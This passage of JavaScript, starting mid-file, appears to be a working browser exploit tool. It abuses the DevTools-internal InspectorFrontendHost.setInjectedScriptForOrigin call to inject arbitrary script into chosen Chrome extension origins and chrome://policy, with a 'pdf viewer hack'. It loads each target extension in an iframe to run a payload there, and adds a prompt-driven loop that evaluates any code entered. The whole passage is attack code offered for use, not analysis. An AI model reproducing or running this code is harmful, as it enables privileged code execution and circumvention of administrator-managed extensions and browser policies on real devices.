                for (const frame of globalMap) {
                    if (!frame) continue;
                    if (frame.idx === d.data.uid) {
                        frame.remove();
                        delete globalMap[globalMap.indexOf(frame)];
                        return;
                    }
                }
            }
            function dbgext(cleanup, id, payload) {
                let x = id;
                while (!x) {
                    x = prompt('Extension id?');
                    if (x === "cancel") {
                        return;
                    }
                }
                let path = '//manifest.json';
                let is_pdf = false;
                let injected = payload ?? payload_swamp.toString();
                if (x === pdfId) {
                    path = "index.html"; // pdf viewer hack
                    is_pdf = true;
                    const b = prompt("code to execute!");
                    if (!b) return;
                    injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));
                    InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', b+'//');
                    
                }
                const URL_1 = `chrome-extension://${x ??
                    alert("NOTREACHED")}/${path}`;
                InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: "remove", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/${path}'); w.onload = function () {(${injected})(w, data.data)} }//`);
                const ifr = document.createElement("iframe");
                ifr.src = URL_1;
                document.body.appendChild(ifr);
                const ifrid = globalMap.push(ifr) - 1;
                ifr.idx = ifrid;
                ifr.onload = function () {

                    ifr.contentWindow.postMessage({
                        type: "uidpass", passcode:
                            ifrid,
                        cleanup: cleanup
                    }, '*');
                    // console.log('hi');
                }
                // alert(1);

            }
            document.querySelector('#extdbg').onclick = function () {
                dbgext(false);
            }
            document.querySelectorAll('.hardcoded').forEach(el => {el.onclick = function () {
                let extid = el.getAttribute("ext");
                console.log(el.innerText, extid);
                dbgext(false, extid);
                }
            });
            document.querySelector('#cleanup').onclick = function () {
                dbgext(true);
            }
            document.querySelector('#devdbg').onclick = function () {
                var l_canceled = false;
                const id = setTimeout(function m() {
                    if (l_canceled) return;
                    (new Function(prompt("Evaluate script! (type 'cancel' to cancel)")))();
                    if (!l_canceled) setTimeout(m, 0);
                    clearTimeout(id);
                });
                Object.defineProperty(window, 'cancel', {
                    get: function () {
                        l_canceled = true;
                    }, configurable: true
                })
                return;
            }
            console.log(globalMap);
        }
        w.eval(`(${ui.toString()})()`);
        window.close();

    }

    function sleep(ms) {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }
})
)()
